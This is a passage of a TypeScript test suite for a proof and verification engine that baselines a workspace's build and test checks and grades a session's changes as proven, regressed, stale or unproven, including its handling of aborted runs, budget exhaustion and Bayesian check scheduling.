import { test, before, after } from 'node:test'
import assert from 'node:assert/strict'
import { promises as fsp } from 'node:fs'
import { fileURLToPath } from 'node:url'
import { join } from 'node:path'

import { ProofEngine } from '../src/engine.ts'
import { assembleProof } from '../src/core/report.ts'
import { attributeChecks, proofNarrative } from '../src/core/regression.ts'
import { buildBaseline, EvidenceStore, isDecisiveStatus, makeEvidence, snapshotWorkspace } from '../src/core/evidence.ts'
import type { ProofGrade } from '../src/core/evidence.ts'
import { merkleRoot, sha256 } from '../src/core/hash.ts'
// v0.20: the training-export tests assert against F1's own schema constant
// and reward law, so the assertions cannot drift from the contract they check.
import { TRAINING_SCHEMA, VERDICT_REWARD, sampleHash } from '../src/core/training.ts'
import { VerificationRunner } from '../src/core/runner.ts'
import { claimIdOf } from '../src/core/attest.ts'
import { SYNTHETIC_TEMPLATE } from '../src/core/synthetic.ts'
// v0.19: the delegation verbs are exercised against REAL APP/1.1 bundles —
// the same builders 22-bundle adjudicates — and against G1's DAG composer.
import { bundleFingerprint } from '../src/core/obligations.ts'
import { buildBundle } from '../src/app/bundle.ts'
import type { ProofBundle } from '../src/app/bundle.ts'
import { SIG_REFUSED_PREFIX, lineDigest } from '../src/core/trust.ts'
import { createProofTools, toVerifyValue } from '../src/dsh/tools.ts'
import { deriveProofPaths, touchesEvidencePath } from '../src/adapters/shared/paths.ts'
import { NodeCommandPort, NodeFsPort, SystemClock } from '../src/node-ports.ts'
import { FakeClock, FakeCommands, FakeWorkspace, MemoryFs, spec } from './helpers.ts'

const ROOT = '/ws'

function project() {
  return {
    [`${ROOT}/package.json`]: JSON.stringify({
      name: 'demo',
      scripts: { test: 'vitest run', build: 'tsc -b' },
    }),
    [`${ROOT}/src/a.ts`]: 'export const a = 1\n',
    [`${ROOT}/src/b.ts`]: "import { a } from './a'\nexport const b = a + 1\n",
    [`${ROOT}/test/a.test.ts`]: "import { a } from '../src/a'\nvoid a\n",
  }
}

function makeEngine(fs: MemoryFs, commands: FakeCommands, dirty: string[] = []) {
  const ws = new FakeWorkspace(ROOT)
  ws.dirty = dirty
  return new ProofEngine({
    root: ROOT,
    fs,
    commands,
    workspace: ws,
    clock: new FakeClock(),
    impactGraphLimit: 1_000,
    checkTimeoutMs: 5_000,
    verifyBudgetMs: 20_000,
    concurrency: 2,
  })
}

/**
 * v0.24 (Y-H-08): the honest delegation deployment — the parent engine holds
 * the SAME host key the child bundle's chain was signed under (the shared
 * trust root H-05's anchor story always described). Since anchoring now
 * DEMANDS adjudication, a keyless parent derives 'unproven' from any bundle:
 * a signature's keyId merely existing is not evidence — somebody trusted
 * must be able to verify it.
 */
function delegatingEngine(fs: MemoryFs, commands: FakeCommands = new FakeCommands()) {
  return new ProofEngine({
    root: ROOT,
    fs,
    commands,
    workspace: new FakeWorkspace(ROOT),
    clock: new FakeClock(),
    signer: () => Promise.resolve(new FakeKey('child-key')),
    impactGraphLimit: 1_000,
  })
}

function preciseEngine(fs: MemoryFs, commands: FakeCommands, checks: ConstructorParameters<typeof ProofEngine>[0]['checks']) {
  return new ProofEngine({
    root: ROOT,
    fs,
    commands,
    workspace: new FakeWorkspace(ROOT),
    clock: new FakeClock(),
    autoDiscover: false,
    checks,
  })
}

test('discovers the workspace objective checks', async () => {
  const engine = makeEngine(MemoryFs.of(project()), new FakeCommands())
  const checks = await engine.loadChecks()
  assert.deepEqual(checks.map(c => c.kind).sort(), ['build', 'test'])
})

test('a clean session: baseline green, verify green -> PROVEN', async () => {
  const fs = MemoryFs.of(project())
  const engine = makeEngine(fs, new FakeCommands())

  const { baseline } = await engine.establishBaseline()
  assert.equal(baseline.checks.length, 2)
  assert.ok(baseline.checks.every(c => c.status === 'pass'))

  const outcome = await engine.verify({ changed: ['src/a.ts'] })
  assert.equal(outcome.report.grade, 'proven')
  assert.equal(outcome.report.summary.regressions, 0)
  assert.equal(outcome.report.baselineRoot, baseline.root)
  assert.equal(outcome.report.root.length, 64, 'proof root is a sha-256 hex digest')
})

test('THE HEADLINE: regression is charged to the session, pre-existing red is not', async () => {
  const commands = new FakeCommands()
    .on(argv => argv.includes('test'), { exitCode: 1, output: 'FAIL test/a.test.ts\nAssertionError: expected 1 to be 2' })
  const fs = MemoryFs.of(project())
  const engine = makeEngine(fs, commands)

  const { baseline } = await engine.establishBaseline()
  assert.equal(baseline.checks.find(c => c.kind === 'test')?.status, 'fail')
  assert.equal(baseline.checks.find(c => c.kind === 'build')?.status, 'pass')

  // The session now breaks `build` too. `test` is still red — but it was red
  // before we touched anything, so it must NOT be charged to this work.
  commands.on(argv => argv.includes('build'), { exitCode: 2, output: "src/b.ts(1,1): error TS2304: Cannot find name 'a'" })
  const outcome = await engine.verify({ changed: ['src/b.ts'] })

  const byKind = new Map(outcome.checks.map(c => [c.kind, c]))
  assert.equal(byKind.get('test')?.verdict, 'still-failing', 'already-red stays pre-existing')
  assert.equal(byKind.get('build')?.verdict, 'regression', 'newly-red is a regression')

  assert.equal(outcome.report.grade, 'regressed')
  assert.equal(outcome.report.summary.regressions, 1)
  assert.equal(outcome.report.summary.preExisting, 1)
  assert.equal(outcome.report.regressions.length, 1)
  assert.match(outcome.report.regressions[0] ?? '', /build/)

  const buildCheck = byKind.get('build')
  assert.ok(buildCheck, 'build check present')
  assert.ok(buildCheck.suspects.includes('src/b.ts'), `suspects: ${buildCheck.suspects.join(', ')}`)
})

test('fixing a pre-existing failure is recognised as FIXED', async () => {
  const commands = new FakeCommands().on(argv => argv.includes('test'), { exitCode: 1, output: 'old failure' })
  const engine = makeEngine(MemoryFs.of(project()), commands)
  await engine.establishBaseline()

  commands.on(argv => argv.includes('test'), { exitCode: 0, output: 'ok' })
  const outcome = await engine.verify({ changed: ['src/a.ts'], all: true })
  assert.equal(outcome.checks.find(c => c.kind === 'test')?.verdict, 'fixed')
  assert.equal(outcome.report.summary.fixed, 1)
})

test('no baseline -> grade is no-baseline, never proven', async () => {
  const engine = makeEngine(MemoryFs.of(project()), new FakeCommands())
  const outcome = await engine.verify({ changed: ['src/a.ts'], all: true })
  assert.equal(outcome.report.grade, 'no-baseline')
  assert.equal(outcome.report.baselineRoot, null)
})

test('a check that could not produce a verdict makes the claim STALE', async () => {
  const commands = new FakeCommands()
  const engine = makeEngine(MemoryFs.of(project()), commands)
  // A green baseline first — since M-36 an error-status batch anchors nothing,
  // so the spawn failure must belong to the VERIFICATION half of the story.
  await engine.establishBaseline()
  commands.on(argv => argv.includes('test'), { exitCode: null, spawnError: 'spawn failed: ENOENT' })
  const outcome = await engine.verify({ changed: ['src/a.ts'], all: true })
  assert.equal(outcome.report.grade, 'stale')
  assert.ok(outcome.report.unverified.length > 0, 'the undecidable check must be named')
})

test('an aborted run refuses to claim PROVEN', async () => {
  const commands = new FakeCommands()
  const engine = makeEngine(MemoryFs.of(project()), commands)
  // A green baseline first — an abort observed *during* the baseline batch is
  // the E1 case and must anchor nothing. This case is the other half: the
  // verification run itself gets killed mid-flight.
  await engine.establishBaseline()
  commands.on(argv => argv.includes('build'), { exitCode: null, aborted: true })
  const outcome = await engine.verify({ changed: ['src/a.ts'], all: true })
  assert.equal(outcome.report.grade, 'stale')
})

test('budget exhaustion marks checks skipped and downgrades to STALE', async () => {
  // H12 tightened the baseline half of this scenario: a budget-starved
  // baseline is an incomplete observation and no longer anchors (see the
  // E1-style case in the H12 block below). The baseline here is therefore
  // established with a healthy budget, and only the VERIFICATION is starved —
  // which is what this case was always about: skipped checks leave the claim
  // stale, never proven.
  const fs = MemoryFs.of(project())
  const commands = new FakeCommands()
  const anchoring = makeEngine(fs, commands)
  await anchoring.establishBaseline()
  const starved = new ProofEngine({
    root: ROOT,
    fs,
    commands,
    workspace: new FakeWorkspace(ROOT),
    clock: new FakeClock(),
    verifyBudgetMs: 1,
  })
  const outcome = await starved.verify({ changed: ['src/a.ts'], all: true })
  assert.equal(outcome.report.grade, 'stale', `got ${outcome.report.grade}`)
  assert.ok(outcome.report.unverified.length > 0)
})

test('a global invalidator forces every check to re-run', async () => {
  const fs = MemoryFs.of(project())
  const engine = makeEngine(fs, new FakeCommands())
  await engine.establishBaseline()
  fs.mutate(`${ROOT}/package.json`, JSON.stringify({
    name: 'demo',
    scripts: { test: 'vitest run', build: 'tsc -b', lint: 'eslint .' },
  }))
  const outcome = await engine.verify({ changed: ['package.json'] })
  assert.equal(outcome.selection.forcedAll, true)
  assert.equal(outcome.report.grade, 'proven')
  assert.equal(outcome.report.unverified.length, 0)
})

test('M7: a script added mid-session joins the next verify — the spec pool cannot silently expire', async () => {
  // The discovery cache used to live for the whole engine instance: a script
  // added after the baseline was invisible to every later verify — never run,
  // never unverified, never blocking a grade. Discovery reads a few manifest
  // files, so the engine's verbs now force re-discovery.
  const fs = MemoryFs.of(project())
  const engine = makeEngine(fs, new FakeCommands())
  await engine.establishBaseline()
  assert.equal((await engine.baseline())?.checks.length, 2, 'two checks at baseline time')

  fs.mutate(`${ROOT}/package.json`, JSON.stringify({
    name: 'demo',
    scripts: { test: 'vitest run', build: 'tsc -b', lint: 'eslint .' },
  }))
  const outcome = await engine.verify({ changed: ['package.json'] })
  assert.equal(outcome.report.discovered, 3, 'the lint script joined the discovered pool')
  assert.ok(outcome.checks.some(c => c.label === 'npm script "lint"'),
    'the new check was selected, run and attributed')
  assert.equal(outcome.report.grade, 'proven', 'the widened pool runs green')
})

test('impact analysis runs only what the change set touched', async () => {
  const fs = MemoryFs.of({
    [`${ROOT}/package.json`]: JSON.stringify({ name: 'demo' }),
    [`${ROOT}/src/a.ts`]: 'export const a = 1\n',
    [`${ROOT}/docs/guide.md`]: '# guide\n',
    [`${ROOT}/docs/note.md`]: '# note\n',
  })
  const engine = preciseEngine(fs, new FakeCommands(), [
    { label: 'src tests', command: ['npm', 'test'], kind: 'test', paths: ['src/**'] },
    { label: 'docs build', command: ['make', 'docs'], kind: 'build', paths: ['docs/**'] },
  ])
  await engine.establishBaseline()

  const outcome = await engine.verify({ changed: ['src/a.ts'] })
  assert.deepEqual(outcome.selection.affected.map(c => c.label), ['src tests'])
  assert.deepEqual(outcome.selection.untouched.map(c => c.label), ['docs build'])
  assert.equal(outcome.checks.find(c => c.label === 'docs build')?.verdict, 'not-run')
  assert.equal(outcome.report.grade, 'proven')
})

test('a change set no check covers is honestly UNPROVEN, not proven', async () => {
  const fs = MemoryFs.of({
    [`${ROOT}/package.json`]: JSON.stringify({ name: 'demo' }),
    [`${ROOT}/src/a.ts`]: 'export const a = 1\n',
    [`${ROOT}/docs/guide.md`]: '# guide\n',
  })
  const engine = preciseEngine(fs, new FakeCommands(), [
    { label: 'src tests', command: ['npm', 'test'], kind: 'test', paths: ['src/**'] },
  ])
  await engine.establishBaseline()

  const outcome = await engine.verify({ changed: ['docs/guide.md'] })
  assert.equal(outcome.selection.affected.length, 0, 'no check covers docs/')
  assert.equal(outcome.report.grade, 'unproven', `got ${outcome.report.grade}`)
})

test('the evidence log survives a full cycle and audits clean', async () => {
  const fs = MemoryFs.of(project())
  const engine = makeEngine(fs, new FakeCommands())
  await engine.establishBaseline()
  await engine.verify({ changed: ['src/a.ts'], all: true })
  const audit = await engine.audit()
  assert.equal(audit.ok, true, `corrupt: ${audit.corrupt.join(', ')}`)
  assert.ok(audit.total >= 4, `expected >= 4 records, got ${audit.total}`)
})

test('concurrent completion order never leaks into the baseline (determinism)', async () => {
  // The slow `test` command is submitted first but settles last; without the
  // reorder the records — and therefore the baselineId, which hashes the
  // checkId sequence — would flip with every race.
  const commands = new FakeCommands()
    .on(argv => argv.includes('test'), { output: 'tests ok' }, { delayMs: 60 })
    .on(argv => argv.includes('build'), { output: 'build ok' }, { delayMs: 1 })
  const engine = makeEngine(MemoryFs.of(project()), commands)
  const { baseline } = await engine.establishBaseline()
  assert.deepEqual(
    baseline.checks.map(c => c.kind),
    ['test', 'build'],
    'records follow discovery order, not wall-clock completion order',
  )

  const reordered = new FakeCommands()
    .on(argv => argv.includes('test'), { output: 'tests ok' }, { delayMs: 1 })
    .on(argv => argv.includes('build'), { output: 'build ok' }, { delayMs: 60 })
  const engine2 = makeEngine(MemoryFs.of(project()), reordered)
  const second = await engine2.establishBaseline()
  assert.deepEqual(
    second.baseline.checks.map(c => c.kind),
    ['test', 'build'],
    'flipping which command is slow must not move records around',
  )
  assert.deepEqual(baseline.checks.map(c => c.checkId), second.baseline.checks.map(c => c.checkId))
})

test('the runner executes subpackage checks inside their own directory', async () => {
  const commands = new FakeCommands()
  const runner = new VerificationRunner(commands, new FakeWorkspace(ROOT), new FakeClock())
  await runner.run([
    spec({ id: 'root-check', command: ['npm', 'run', '--silent', 'test'] }),
    spec({ id: 'sub-check', command: ['npm', 'run', '--silent', 'test'], cwd: 'packages/a' }),
  ], { concurrency: 2 })
  const cwds = commands.calls.map(c => c.cwd).sort()
  assert.deepEqual(cwds, [ROOT, `${ROOT}/packages/a`], `got ${cwds.join(', ')}`)
})

test('assembleProof is deterministic for identical inputs', () => {
  const clock = new FakeClock()
  const ws = snapshotWorkspace('h', [])
  const s = spec({ id: 'x', paths: ['src/**'] })
  const input = {
    specs: [s],
    records: [],
    changed: ['src/a.ts'],
    workspace: ws,
    clock,
    requireFullCoverage: true,
  }
  const first = assembleProof(input)
  const second = assembleProof(input)
  assert.equal(first.report.root, second.report.root)
  assert.equal(first.report.grade, second.report.grade)
})

test('attributeChecks explains every verdict in one line', () => {
  const s = spec({ id: 'x', label: 'unit tests', paths: ['src/**'] })
  const pass = { evidenceId: 'p', checkId: 'x', status: 'pass' as const, outputHead: '' }
  const fail = { evidenceId: 'f', checkId: 'x', status: 'fail' as const, outputHead: 'boom' }
  const checks = attributeChecks({
    checks: [s],
    baselineById: new Map([['x', pass as never]]),
    currentById: new Map([['x', fail as never]]),
    changed: ['src/a.ts'],
  })
  assert.equal(checks[0]?.verdict, 'regression')
  assert.match(checks[0]?.rationale ?? '', /charged to this session/)
  assert.ok(checks[0]?.attributedTo.includes('src/a.ts'))
})

// -- E1: aborted baselines must not land on disk --------------------------------

test('E1: an aborted baseline run keeps its evidence but never becomes the anchor', async () => {
  const commands = new FakeCommands()
    .on(argv => argv.includes('build'), { exitCode: null, aborted: true })
  const fs = MemoryFs.of(project())
  const engine = makeEngine(fs, commands)

  const { baseline, records } = await engine.establishBaseline()
  // The half-run comes back — flagged as aborted on the returned object...
  assert.equal(baseline.aborted, true)
  assert.equal(records.length, 2, 'observed facts are still returned')
  // ...but nothing anchor-shaped exists on disk.
  assert.equal(await fs.readFile(`${ROOT}/.proof/baseline.json`), undefined, 'an aborted run must not write baseline.json')
  assert.equal(await engine.baseline(), undefined)
  // The chain keeps the facts and names the abort.
  assert.ok(fs.log.some(l => l.includes('"status":"aborted"')), 'aborted evidence record present')
  assert.ok(fs.log.some(l => l.includes('baseline/aborted')), 'abort marker present')
  assert.ok(!fs.log.some(l => l.includes('baseline/saved')), 'no baseline/saved marker may exist')
  // The next verify anchors on nothing and says so, instead of silently
  // diffing against a half-built truth.
  const outcome = await engine.verify({ changed: ['src/a.ts'] })
  assert.equal(outcome.report.grade, 'no-baseline')
})

test('H12: a budget-starved baseline is an incomplete observation — it anchors nothing', async () => {
  // E1's own rule, extended to the SILENT truncation shapes: a baseline whose
  // tail was `skipped` (budget drained) or `timeout` observed fewer checks
  // than the workspace declares, and a half-observed truth must not become
  // THE anchor. The FakeClock advances 1ms per read, so verifyBudgetMs:1 is
  // exhausted before the first spec is ever dispatched — every record lands
  // `skipped`, the batch flag stays down, and only the record-level guard
  // catches it.
  const fs = MemoryFs.of(project())
  const engine = new ProofEngine({
    root: ROOT,
    fs,
    commands: new FakeCommands(),
    workspace: new FakeWorkspace(ROOT),
    clock: new FakeClock(),
    verifyBudgetMs: 1,
  })

  const { baseline, records } = await engine.establishBaseline()
  assert.equal(baseline.aborted, true, 'a starved batch is an abort, not an anchor')
  assert.ok(records.length === 2 && records.every(r => r.status === 'skipped'),
    'the budget died before any spec ran')
  assert.equal(await fs.readFile(`${ROOT}/.proof/baseline.json`), undefined,
    'an incomplete observation must not write baseline.json')
  assert.ok(fs.log.some(l => l.includes('baseline/aborted') && l.includes('incomplete-observation')),
    'the abort marker names the reason')
  const outcome = await engine.verify({ changed: ['src/a.ts'] })
  assert.equal(outcome.report.grade, 'no-baseline', 'the next verify honestly reports there is no anchor')
})

test('M36: a spawn-error suite anchors nothing — no answer is not an observation', async () => {
  // The last silent-truncation shape: every command ENOENTs, so every record
  // lands `error` — a status the evidence layer's own DECISIVE_STATUSES calls
  // non-decisive. An anchor here would have recorded a "healthy baseline"
  // over a batch that observed literally nothing; E1's guard now refuses it
  // exactly like the skipped/timeout shapes.
  const fs = MemoryFs.of(project())
  const commands = new FakeCommands().on(() => true, { exitCode: null, spawnError: 'spawn failed: ENOENT' })
  const engine = makeEngine(fs, commands)
  const { baseline, records } = await engine.establishBaseline()
  assert.ok(records.length === 2 && records.every(r => r.status === 'error'),
    'the environment is dead: every check errored')
  assert.equal(baseline.aborted, true, 'an error-only batch is an incomplete observation')
  assert.equal(await fs.readFile(`${ROOT}/.proof/baseline.json`), undefined,
    'no baseline file was written')
  assert.ok(fs.log.some(l => l.includes('baseline/aborted') && l.includes('incomplete-observation')),
    'the abort marker names the reason')
  const outcome = await engine.verify({ changed: ['src/a.ts'] })
  assert.equal(outcome.report.grade, 'no-baseline', 'the next verify honestly reports there is no anchor')
})

// -- E2: signer degradation must be visible -------------------------------------

test('E2: a signer that cannot load degrades loudly — marker in the chain, chain still intact', async () => {
  const fs = MemoryFs.of(project())
  const warnings: string[] = []
  const engine = new ProofEngine({
    root: ROOT,
    fs,
    commands: new FakeCommands(),
    workspace: new FakeWorkspace(ROOT),
    clock: new FakeClock(),
    // Minimal injection: a host signer provider whose key material is gone.
    signer: () => Promise.reject(new Error('trust keys dir is not writable')),
    verbose: true,
    logger: message => warnings.push(message),
  })
  const { baseline } = await engine.establishBaseline()
  // The marker is fired, not awaited (see watchSigner: awaiting it inside the
  // signer resolution would self-deadlock the store's single-flight queue), so
  // it lands one queue-slot behind the in-flight checkpoint — drain
  // deterministically instead of racing the log read.
  for (let i = 0; i < 200 && !fs.log.some(l => l.includes('trust/signer-unavailable')); i++) {
    await new Promise(resolve => setTimeout(resolve, 5))
  }
  // The degradation itself is a chain fact, with the reason attached.
  assert.ok(fs.log.some(l => l.includes('trust/signer-unavailable')), 'degradation marker in the evidence log')
  assert.ok(fs.log.some(l => l.includes('trust keys dir is not writable')), 'marker carries the failure reason')
  assert.ok(warnings.some(l => l.includes('signer unavailable')), 'verbose channel warned')
  // Unsigned — but honestly so, and the chain still audits clean.
  const audit = await engine.audit()
  assert.equal(audit.chain.mode, 'unsigned')
  assert.equal(audit.ok, true, `chain broke: ${JSON.stringify(audit.chain)}`)
  assert.equal((await engine.baseline())?.baselineId, baseline.baselineId)
})

// -- E3: git invisibility forces the full check set ------------------------------

test('E3 (port contract): FakeWorkspace.gitAvailableValue models absent, true and false', async () => {
  const ws = new FakeWorkspace(ROOT)
  assert.equal(typeof ws.gitAvailable, 'function', 'default: capability present, git available')
  assert.equal(await ws.gitAvailable?.(), true)
  ws.gitAvailableValue = false
  assert.equal(await ws.gitAvailable?.(), false)
  ws.gitAvailableValue = null
  assert.equal(ws.gitAvailable, undefined, 'null removes the method entirely, like a port that never had it')
})

test('E3: git unavailable forces the full check set even for a narrow change', async () => {
  const fs = MemoryFs.of(project())
  const ws = new FakeWorkspace(ROOT)
  ws.gitAvailableValue = false
  const engine = new ProofEngine({
    root: ROOT,
    fs,
    commands: new FakeCommands(),
    workspace: ws,
    clock: new FakeClock(),
    impactGraphLimit: 1_000,
  })
  await engine.establishBaseline()
  // src/a.ts was clean at baseline; now it moves.
  fs.mutate(`${ROOT}/src/a.ts`, 'export const a = 2\n')
  const outcome = await engine.verify({ changed: ['src/a.ts'] })
  assert.equal(outcome.selection.forcedAll, true, 'a git-less change set must not narrow the run')
  assert.equal(outcome.selection.precision, 'forced')
  assert.equal(outcome.selection.affected.length, 2, 'every discovered check is selected')
  assert.equal(outcome.selection.untouched.length, 0)
  assert.equal(outcome.degraded, true, 'degradation is surfaced on the outcome')
  assert.equal(outcome.report.grade, 'proven', 'the forced run itself still grades normally')
})

// -- β: bayesian wave scheduling + graded trust ----------------------------------

function waveProject() {
  return {
    [`${ROOT}/package.json`]: JSON.stringify({ name: 'demo' }),
    [`${ROOT}/src/a.ts`]: 'export const a = 1\n',
    [`${ROOT}/src/b.ts`]: 'export const b = 1\n',
    [`${ROOT}/src/c.ts`]: 'export const c = 1\n',
    [`${ROOT}/src/d.ts`]: 'export const d = 1\n',
  }
}

const WAVE_CHECKS = [
  { label: 'a tests', command: ['npm', 'run', '--silent', 'a'], kind: 'test' as const, paths: ['src/a.ts'] },
  { label: 'b tests', command: ['npm', 'run', '--silent', 'b'], kind: 'test' as const, paths: ['src/b.ts'] },
  { label: 'c tests', command: ['npm', 'run', '--silent', 'c'], kind: 'test' as const, paths: ['src/c.ts'] },
  { label: 'd tests', command: ['npm', 'run', '--silent', 'd'], kind: 'test' as const, paths: ['src/d.ts'] },
]

const WAVE_CHANGED = ['src/a.ts', 'src/b.ts', 'src/c.ts', 'src/d.ts']

function waveEngine(
  fs: MemoryFs,
  commands: FakeCommands,
  overrides: Partial<ConstructorParameters<typeof ProofEngine>[0]> = {},
) {
  return new ProofEngine({
    root: ROOT,
    fs,
    commands,
    workspace: new FakeWorkspace(ROOT),
    clock: new FakeClock(),
    autoDiscover: false,
    checks: WAVE_CHECKS,
    concurrency: 2,
    impactGraphLimit: 1_000,
    checkTimeoutMs: 5_000,
    verifyBudgetMs: 20_000,
    ...overrides,
  })
}

/** Seed straight green history straight into the evidence log, behind the engine's back. */
async function seedGreenHistory(engine: ProofEngine, passes: number): Promise<void> {
  const specs = await engine.loadChecks()
  const clock = new FakeClock()
  const ws = snapshotWorkspace('abc123', [])
  for (let i = 0; i < passes; i++) {
    for (const s of specs) {
      await engine.storeView.append(makeEvidence(s, { status: 'pass', exitCode: 0, durationMs: 5, output: 'ok' }, ws, clock))
    }
  }
}

test('β: bayesian scheduling certifies early — planned skips carry their priors', async () => {
  const fs = MemoryFs.of(waveProject())
  const commands = new FakeCommands()
  const engine = waveEngine(fs, commands, { certifyTarget: 0.5 })
  await engine.establishBaseline()
  await seedGreenHistory(engine, 6)

  const callsBefore = commands.calls.length
  const outcome = await engine.verify({ changed: WAVE_CHANGED })

  const schedule = outcome.schedule
  assert.ok(schedule, 'bayesian mode carries schedule metadata')
  assert.equal(schedule.mode, 'bayesian')
  assert.equal(schedule.waves, 1, 'one wave dispatched')
  assert.equal(schedule.stoppedEarly, 'certified')
  assert.equal(commands.calls.length - callsBefore, 2, 'only the first wave actually executed')
  assert.equal(schedule.skippedByPlan.length, 2, 'the rest of the plan is a planned skip')
  for (const skip of schedule.skippedByPlan) {
    assert.ok(skip.priorHealthy > 0.5 && skip.priorHealthy < 1, `prior for ${skip.checkId} is a healthy probability`)
  }
  assert.deepEqual(schedule.skippedByPlan.map(s => s.checkId), outcome.report.unverified, 'unverified is exactly the planned skips')
  assert.ok(outcome.report.confidence !== undefined && outcome.report.confidence >= 0.5, 'claim posterior crosses the target')
  assert.equal(outcome.report.grade, 'proven')
  assert.equal(outcome.report.confidenceBasis, 'certified-subset')
  assert.match(proofNarrative(outcome.report), /PROVEN \(p≈0\.\d+\)/)
})

test('β: a decisive failure in the first wave stops the plan — attribution over coverage', async () => {
  const fs = MemoryFs.of(waveProject())
  const commands = new FakeCommands()
  const engine = waveEngine(fs, commands)
  await engine.establishBaseline()
  commands.on(() => true, { exitCode: 1, output: 'boom' })

  const callsBefore = commands.calls.length
  const outcome = await engine.verify({ changed: WAVE_CHANGED })

  const schedule = outcome.schedule
  assert.ok(schedule)
  assert.equal(schedule.stoppedEarly, 'failed')
  assert.equal(schedule.waves, 1)
  assert.equal(commands.calls.length - callsBefore, 2, 'no second wave is dispatched after a decisive failure')
  assert.equal(schedule.skippedByPlan.length, 2)
  assert.equal(outcome.report.grade, 'regressed')
  assert.equal(outcome.report.summary.regressions, 2)
  assert.equal(outcome.report.confidenceBasis, 'degraded')
  assert.ok((outcome.report.confidence ?? 1) < 0.97, 'a dead assertion drags the claim posterior down')
})

test('β: scheduler set keeps the legacy whole-batch behaviour', async () => {
  const fs = MemoryFs.of(waveProject())
  const commands = new FakeCommands()
  const engine = waveEngine(fs, commands, { scheduler: 'set' })
  await engine.establishBaseline()

  const callsBefore = commands.calls.length
  const outcome = await engine.verify({ changed: WAVE_CHANGED })

  assert.equal(outcome.schedule, undefined, 'no wave metadata on the legacy path')
  assert.equal(commands.calls.length - callsBefore, 4, 'every affected check ran')
  assert.equal(outcome.report.grade, 'proven')
  assert.equal(outcome.report.unverified.length, 0)
  assert.ok(outcome.report.confidence !== undefined, 'the whole-batch path still displays a confidence number')
  assert.equal(outcome.report.confidenceBasis, 'full-coverage')
})

test('β: identical inputs produce byte-identical confidence (determinism)', async () => {
  const runOnce = async () => {
    const fs = MemoryFs.of(waveProject())
    const commands = new FakeCommands()
    const engine = waveEngine(fs, commands, { certifyTarget: 0.9 })
    await engine.establishBaseline()
    await seedGreenHistory(engine, 6)
    return engine.verify({ changed: WAVE_CHANGED })
  }
  const first = await runOnce()
  const second = await runOnce()
  assert.strictEqual(first.report.confidence, second.report.confidence, 'confidence is bit-for-bit stable')
  assert.equal(JSON.stringify(first.schedule), JSON.stringify(second.schedule))
  assert.equal(first.report.root, second.report.root)
})

test('β: budget exhaustion degrades below target and grades stale', async () => {
  const fs = MemoryFs.of(waveProject())
  const commands = new FakeCommands()
  const warm = waveEngine(fs, commands)
  await warm.establishBaseline()

  // A second engine over the same evidence log, holding a budget the
  // FakeClock (1ms per read) exhausts before the first wave can be afforded.
  const starved = waveEngine(fs, commands, { verifyBudgetMs: 1 })
  const outcome = await starved.verify({ changed: WAVE_CHANGED })

  const schedule = outcome.schedule
  assert.ok(schedule)
  assert.equal(schedule.stoppedEarly, 'budget')
  assert.equal(schedule.waves, 0, 'no wave was ever dispatched')
  assert.equal(schedule.skippedByPlan.length, 4, 'the whole plan is skipped')
  assert.equal(outcome.report.grade, 'stale')
  assert.equal(outcome.report.confidenceBasis, 'degraded')
  assert.ok((outcome.report.confidence ?? 1) < 0.97, 'the claim never reached the target')
})

/**
 * H2: the prior-only certification fixture — ONE check carrying a deep green
 * history (baseline + 30 seeded passes → 31 observed runs, all pass), so its
 * prior (≈0.972) clears the default 0.97 certify target on its own. That
 * number is history's, not this run's; the two cases below pin that it can
 * never stand in for an observation this run did not make.
 */
function priorOnlyEngine(fs: MemoryFs, commands: FakeCommands) {
  return new ProofEngine({
    root: ROOT,
    fs,
    commands,
    workspace: new FakeWorkspace(ROOT),
    clock: new FakeClock(),
    autoDiscover: false,
    checks: [{ label: 'a tests', command: ['npm', 'run', '--silent', 'a'], kind: 'test', paths: ['src/a.ts'] }],
    concurrency: 2,
    impactGraphLimit: 1_000,
    checkTimeoutMs: 5_000,
    verifyBudgetMs: 20_000,
  })
}

test('β (H2): a pre-aborted signal observes nothing — a prior product above the target still grades stale', async () => {
  const fs = MemoryFs.of(waveProject())
  const engine = priorOnlyEngine(fs, new FakeCommands())
  await engine.establishBaseline()
  await seedGreenHistory(engine, 30)

  const controller = new AbortController()
  controller.abort()
  const outcome = await engine.verify({ changed: ['src/a.ts'], signal: controller.signal })

  const schedule = outcome.schedule
  assert.ok(schedule, 'the bayesian path ran and planned')
  assert.equal(schedule.waves, 0, 'zero waves dispatched')
  assert.equal(schedule.stoppedEarly, 'budget')
  // The trap this case pins: zero records, zero observations, every factor a
  // prior — and the prior product sits ABOVE the certify target. The old
  // grade rule certified on that number alone; a prior is what the check
  // brought to the table, not what this run measured.
  assert.ok(outcome.report.confidence !== undefined && outcome.report.confidence >= 0.97,
    `prior product ${outcome.report.confidence} crosses the target — and still proves nothing`)
  assert.equal(outcome.report.grade, 'stale', 'a run that observed nothing is unfinished, never proven')
  assert.notEqual(outcome.report.confidenceBasis, 'certified-subset')
  assert.equal(outcome.report.confidenceBasis, 'degraded')
  assert.deepEqual(outcome.report.unverified, schedule.skippedByPlan.map(s => s.checkId))
})

test('β (H2): a high-prior check that cannot answer certifies nothing — the plan ends starved, not certified', async () => {
  const fs = MemoryFs.of(waveProject())
  const commands = new FakeCommands()
  const engine = priorOnlyEngine(fs, commands)
  await engine.establishBaseline()
  await seedGreenHistory(engine, 30)
  // The one check now dies at spawn: a non-decisive `error` record — the same
  // knowledge-lattice bucket as timeout/skipped (no verdict). Its prior would
  // clear the target on its own; the wave that heard nothing cannot certify.
  commands.on(() => true, { exitCode: null, spawnError: 'spawn failed: ENOENT' })

  const outcome = await engine.verify({ changed: ['src/a.ts'] })

  const schedule = outcome.schedule
  assert.ok(schedule)
  assert.equal(schedule.waves, 1, 'the plan dispatched the check')
  assert.notEqual(schedule.stoppedEarly, 'certified', 'a wave with zero decisive records cannot certify')
  assert.equal(schedule.stoppedEarly, 'budget', 'the unanswered check ends the plan as starved')
  assert.equal(outcome.report.grade, 'stale')
  assert.ok(outcome.report.confidence !== undefined && outcome.report.confidence >= 0.97,
    `prior product ${outcome.report.confidence} crosses the target — and still proves nothing`)
  assert.equal(outcome.report.confidenceBasis, 'degraded')
  assert.equal(outcome.report.unverified.length, 1, 'the unanswered check is named as unverified')
})

// -- ζ: typed claim contracts wired into the engine -------------------------------

/**
 * A workspace whose package.json declares a source entry point, so the engine
 * derives an API surface: index re-exports a and b, b imports a internally.
 */
function surfaceProject() {
  return {
    [`${ROOT}/package.json`]: JSON.stringify({
      name: 'demo',
      main: './src/index.ts',
      scripts: { test: 'vitest run', build: 'tsc -b' },
    }),
